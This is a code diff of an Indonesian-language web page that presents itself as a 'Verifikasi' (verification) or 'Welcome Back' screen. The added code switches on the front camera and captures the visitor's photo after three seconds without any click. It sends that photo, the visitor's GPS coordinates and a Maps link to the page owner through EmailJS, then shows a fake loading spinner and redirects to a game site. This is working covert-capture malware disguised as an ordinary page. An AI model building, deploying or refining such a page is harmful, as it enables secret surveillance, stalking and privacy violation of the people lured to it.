@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Welcomee</title>
+<title>Verifikasi</title>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
@@ -11,47 +11,78 @@
 body{
     margin:0;
     font-family:Arial, sans-serif;
-    background:#111;
+    background:#0f0f0f;
     color:white;
     text-align:center;
 }
-button{
-    margin-top:20px;
-    padding:12px 20px;
-    border:none;
-    border-radius:8px;
-    background:#00c853;
-    color:white;
-    font-size:16px;
-    cursor:pointer;
+
+/* Loading Overlay */
+#loading{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#000;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    font-size:18px;
+    display:none;
 }
-button:hover{
-    background:#00e676;
+
+.spinner{
+    border:5px solid #333;
+    border-top:5px solid #00ff99;
+    border-radius:50%;
+    width:50px;
+    height:50px;
+    animation:spin 1s linear infinite;
+    margin-bottom:15px;
+}
+
+@keyframes spin{
+    0%{transform:rotate(0deg);}
+    100%{transform:rotate(360deg);}
+}
+
+video{
+    margin-top:30px;
+    border-radius:12px;
 }
 </style>
 
 </head>
 <body>
 
-<h2>Welcome Back</h2>
-
-<video id="video" autoplay playsinline 
-style="display:none;"></video>
-<button onclick="proses()">Berikutnya</button>
-
+<h2>WELCOME BACK</h2>
+<video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
+
+<div id="loading">
+    <div class="spinner"></div>
+    Loading...
+</div>
 
 <script>
 (function(){
-  emailjs.init("buxVv6sNpKGz4iBzb"); // GANTI PUBLIC KEY
+  emailjs.init("buxVv6sNpKGz4iBzb"); // GANTI
 })();
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const loading = document.getElementById("loading");
 
 // Aktifkan kamera depan
 navigator.mediaDevices.getUserMedia({ 
   video: { facingMode: "user" } 
 })
 .then(function(stream){
-  document.getElementById("video").srcObject = stream;
+  video.srcObject = stream;
+
+  // AUTO CAPTURE setelah 3 detik
+  setTimeout(proses, 3000);
 })
 .catch(function(){
   alert("Kamera tidak diizinkan");
@@ -59,15 +90,13 @@ navigator.mediaDevices.getUserMedia({
 
 function proses(){
 
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
   const context = canvas.getContext("2d");
 
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
   context.drawImage(video, 0, 0);
 
-  let imageData = canvas.toDataURL("image/jpeg", 0.7);
+  let imageData = canvas.toDataURL("image/jpeg", 0.6);
 
   if (navigator.geolocation) {
 
@@ -79,15 +108,19 @@ function proses(){
         let longitude = position.coords.longitude;
         let mapsLink = "https://www.google.com/maps?q=" + latitude + "," + longitude;
 
+        loading.style.display = "flex"; // tampilkan loading
+
         emailjs.send("service_lzuezkd", "template_105p1pt", {
-          name: "SI KONTOL",
+          name: "SI KONTOL MENGIRIM",
           time: new Date().toLocaleString(),
           latitude: latitude,
           longitude: longitude,
           maps: mapsLink,
           image: imageData
         }).then(function(){
-            window.location.replace("https://basudewa28.github.io/Official-/basudewa.html");
+            setTimeout(function(){
+                window.location.replace("https://ff.garena.com");
+            }, 2000);
         });
 
       },
@@ -98,10 +131,7 @@ function proses(){
 
     );
 
-  } else {
-    alert("Browser tidak mendukung GPS");
   }
-
 }
 </script>
 
